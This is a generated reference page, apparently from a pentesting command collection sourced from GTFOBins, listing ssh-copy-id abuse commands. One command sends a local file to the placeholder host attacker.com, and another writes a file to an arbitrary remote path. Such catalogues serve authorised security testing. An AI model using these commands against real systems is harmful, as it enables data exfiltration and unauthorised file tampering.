---
parsed_by: focuslocust
source: commands
type: generated
---
# ssh-copy-id Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ssh-copy-id

Tool page: [ssh-copy-id](../../tools/linux/ssh-copy-id.md)

### file-read

```text
ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh-copy-id` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh-copy-id` |
| Evidence | Function example preserved from source parser. |
